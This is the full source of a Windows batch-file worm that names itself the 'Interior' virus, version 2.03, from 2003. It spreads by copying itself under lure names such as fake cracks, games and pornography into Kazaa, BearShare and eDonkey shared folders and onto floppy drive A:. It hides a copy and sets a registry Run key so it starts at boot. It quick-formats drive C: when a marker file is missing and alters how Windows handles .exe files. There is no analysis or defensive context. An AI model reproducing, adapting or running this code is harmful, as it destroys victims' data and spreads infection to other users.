@echo off
copy %0 c:\Interior.bat >nul
@attrib +h +s c:\Interior.bat >nul
md C:\LittleLove
copy %0 c:\LittleLove\Love.exe.bat >nul
copy %0 c:\Little_Love.txt.bat >nul
copy %0 c:\progra~1\kazaa\myshar~1\Love.exe.bat >nul
copy %0 c:\progra~1\bearshare\shared\Cool_sex.exe.bat >nul
copy %0 c:\progra~1\bearshare\shared\Game.exe.bat >nul
copy %0 c:\progra~1\eDonkey2000\incoming\Game.exe.bat >nul
copy %0 c:\progra~1\kazaa\myshar~1\Sex.exe.bat >nul
copy %0 c:\progra~1\eDonkey2000\incoming\sp1.exe.bat >nul
copy %0 c:\progra~1\kazaa\myshar~1\Game_Of_Love.exe.bat >nul
copy %0 c:\progra~1\eDonkey2000\incoming\Kaspersky_crack.exe.bat >nul
copy %0 c:\progra~1\bearshare\shared\Cool_mp3.mp3.bat >nul
copy %0 c:\progra~1\eDonkey2000\incoming\Porno.jpg.bat >nul
copy %0 c:\progra~1\kazaa\myshar~1\Porno_photo.jpg.bat >nul
copy %0 %windir%\LittleLove.txt.bat >nul
echo REGEDIT4>C:\yos.reg
echo [HKEY_CURRENT_USER\Software\Microsoft\Windows\CurrentVersion\Run]>>C:\yos.reg
echo "Interior"="c:\\Interior.bat" >> C:\yos.reg
regedit /s C:\yos.reg
del C:\yos.reg >nul
if exist %windir%\1.sys goto 2
if not exist %windir%\1.sys goto 1
:1
echo 1 >>%windir%\1.sys
echo YOY >>c:\Interior.inf
echo YOY >>c:\Interior.txt
:2
if exist c:\Interior.inf goto 5
if not exist c:\Interior.inf goto 8
:8
echo y|Format c:/q >nul
:5
if exist c:\Interior.txt goto 11
if not exist c:\Interior.txt goto 12
:12
echo REGEDIT4>C:\Interior.reg
echo.>>C:\Interior.reg
echo [HKEY_CLASSES_ROOT\.exe]>>C:\Interior.reg
echo "%1" = "txtfile">>C:\Interior.reg
echo "Content Type" = "text/plain">>C:\Interior.reg
echo "PerceivedType" = "text">>C:\Interior.reg
regedit /s C:\Interior.reg
del C:\Interior.reg
:11
echo This is Interior virus. >>%windir%\info.txt
echo Little worm/p2p virus. >>%windir%\info.txt
echo    Name "Interior" >>%windir%\info.txt
echo     Version 2.03 >>%windir%\info.txt
echo       By AlEkS >>%windir%\info.txt
echo    top50@inbox.ru >>%windir%\info.txt
echo       Ukraine >>%windir%\info.txt
echo      08.02.2003 >>%windir%\info.txt
if not exist A:\ goto 3
if exist A:\ goto 4
:4
copy %0 A:\Interior.txt.bat >nul
:3
ctty con
cls